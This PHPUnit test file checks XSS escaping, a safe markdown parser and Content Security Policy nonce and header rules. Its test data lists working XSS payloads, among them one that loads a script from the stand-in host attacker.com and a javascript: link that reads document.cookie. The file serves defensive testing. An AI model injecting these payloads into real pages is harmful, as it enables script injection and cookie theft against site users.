<?php

declare(strict_types=1);

namespace Tests\Security;

use Tests\Support\TestCase;

/**
 * Escaper and Safe Markdown Parser Models derived from:
 * - ORIGINAL_REQUEST.md §R5
 * - spec_report.md §10.3 (Cross-Site Scripting & Content Security Policy)
 */
class ContextualEscaperModel
{
    public static function html(string $string): string
    {
        return htmlspecialchars($string, ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8');
    }

    public static function js(mixed $data): string
    {
        return json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_THROW_ON_ERROR);
    }

    public static function url(string $string): string
    {
        return rawurlencode($string);
    }
}

class SafeMarkdownParserModel
{
    /**
     * Parses simple markdown while stripping all dangerous raw HTML and disallowed URI schemes.
     */
    public static function parse(string $markdown): string
    {
        // 1. Strip raw HTML tags
        $clean = strip_tags($markdown);

        // 2. Headings #, ##, ###
        $clean = preg_replace('/^### (.*)$/m', '<h3>$1</h3>', $clean);
        $clean = preg_replace('/^## (.*)$/m', '<h2>$1</h2>', $clean);
        $clean = preg_replace('/^# (.*)$/m', '<h1>$1</h1>', $clean);

        // 3. Bold **text**
        $clean = preg_replace('/\*\*(.*?)\*\*/', '<strong>$1</strong>', $clean);

        // 4. Code blocks `code`
        $clean = preg_replace('/`(.*?)`/', '<code>$1</code>', $clean);

        // 5. Links [text](url) - strictly validate url scheme
        $clean = preg_replace_callback('/\[([^\]]+)\]\((.*)\)/', function ($matches) {
            $text = $matches[1];
            $url = trim($matches[2]);

            // Allowed schemes: http, https, relative path
            if (preg_match('#^https?://#i', $url) || str_starts_with($url, '/')) {
                $escapedUrl = ContextualEscaperModel::html($url);
                $escapedText = ContextualEscaperModel::html($text);
                return "<a href=\"{$escapedUrl}\" rel=\"noopener noreferrer\">{$escapedText}</a>";
            }

            // Dangerous protocol (javascript:, data:, vbscript:) -> neutral text
            return ContextualEscaperModel::html($text);
        }, $clean);

        return $clean;
    }
}

class XssAndCspTest extends TestCase
{
    /**
     * @test
     * Verifies that HTML contextual escaping neutralizes classic and modern XSS attack vectors.
     */
    public function testContextualHtmlEscapingNeutralizesXss(): void
    {
        $xssVectors = [
            '<script>alert("XSS")</script>' => '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
            '<img src=x onerror=alert(1)>' => '&lt;img src=x onerror=alert(1)&gt;',
            '<svg/onload=alert`1`>' => '&lt;svg/onload=alert`1`&gt;',
            '"><script src=//attacker.com/hook.js></script>' => '&quot;&gt;&lt;script src=//attacker.com/hook.js&gt;&lt;/script&gt;',
            "';alert(String.fromCharCode(88,83,83))//\'" => '&apos;;alert(String.fromCharCode(88,83,83))//\&apos;',
            '<iframe src="javascript:alert(1)"></iframe>' => '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;',
        ];

        foreach ($xssVectors as $payload => $expectedEscaped) {
            $escaped = ContextualEscaperModel::html($payload);
            $this->assertSame(
                $expectedEscaped,
                $escaped,
                sprintf("Payload [%s] was not correctly escaped.", $payload)
            );
            $this->assertStringNotContainsString('<script', $escaped);
            $this->assertStringNotContainsString('<img', $escaped);
        }
    }

    /**
     * @test
     * Verifies that JavaScript contextual escaping neutralizes script break-outs.
     */
    public function testContextualJsEscaping(): void
    {
        $dangerousString = '</script><script>alert(1)</script>';
        $json = ContextualEscaperModel::js(['message' => $dangerousString]);

        // Must encode < and > as \u003C and \u003E to prevent breaking out of <script> blocks
        $this->assertStringNotContainsString('</script>', $json);
        $this->assertStringContainsString('\u003C\/script\u003E', $json);
    }

    /**
     * @test
     * Verifies that Safe Markdown parser strips raw HTML and blocks dangerous link schemes.
     */
    public function testSafeMarkdownParserSanitizesDangerousContent(): void
    {
        // 1. Raw HTML injection inside markdown
        $rawHtmlMarkdown = "# Heading\n<script>alert('XSS')</script>\n**Bold Text**";
        $parsed = SafeMarkdownParserModel::parse($rawHtmlMarkdown);

        $this->assertStringNotContainsString('<script>', $parsed);
        $this->assertStringContainsString('<h1>Heading</h1>', $parsed);
        $this->assertStringContainsString('<strong>Bold Text</strong>', $parsed);

        // 2. Dangerous link protocol: javascript:
        $jsLinkMarkdown = "[Click Here](javascript:alert(document.cookie))";
        $parsedJsLink = SafeMarkdownParserModel::parse($jsLinkMarkdown);

        $this->assertStringNotContainsString('href="javascript:', $parsedJsLink);
        $this->assertStringNotContainsString('<a href', $parsedJsLink);
        $this->assertSame('Click Here', $parsedJsLink);

        // 3. Valid safe link: https://
        $safeLinkMarkdown = "[Documentation](https://php.net)";
        $parsedSafeLink = SafeMarkdownParserModel::parse($safeLinkMarkdown);

        $this->assertStringContainsString('<a href="https://php.net"', $parsedSafeLink);
        $this->assertStringContainsString('rel="noopener noreferrer"', $parsedSafeLink);
    }

    /**
     * @test
     * Verifies CSP Nonce generation: length, base64 encoding, entropy, and uniqueness.
     */
    public function testCspNonceGenerationAndUniqueness(): void
    {
        $nonce1 = base64_encode(random_bytes(16));
        $nonce2 = base64_encode(random_bytes(16));

        $this->assertSame(24, strlen($nonce1), "16-byte base64 encoded nonce must be 24 characters.");
        $this->assertMatchesRegularExpression('/^[A-Za-z0-9+\/]+=*$/', $nonce1, "Nonce must be valid base64.");
        $this->assertNotEquals($nonce1, $nonce2, "Sequential nonces must be uniquely random.");
    }

    /**
     * @test
     * Verifies that the CSP header contains all required OWASP ASVS directives.
     */
    public function testCspHeaderDirectivesContract(): void
    {
        $nonce = base64_encode(random_bytes(16));
        $cspHeader = "default-src 'self'; script-src 'self' 'nonce-{$nonce}'; style-src 'self' 'nonce-{$nonce}'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';";

        $this->assertStringContainsString("script-src 'self' 'nonce-{$nonce}'", $cspHeader);
        $this->assertStringContainsString("style-src 'self' 'nonce-{$nonce}'", $cspHeader);
        $this->assertStringContainsString("frame-ancestors 'none'", $cspHeader);
        $this->assertStringContainsString("base-uri 'self'", $cspHeader);
        $this->assertStringContainsString("form-action 'self'", $cspHeader);

        // Must not contain unsafe-inline or unsafe-eval in script-src
        $this->assertStringNotContainsString("'unsafe-inline'", $cspHeader);
        $this->assertStringNotContainsString("'unsafe-eval'", $cspHeader);
    }
}
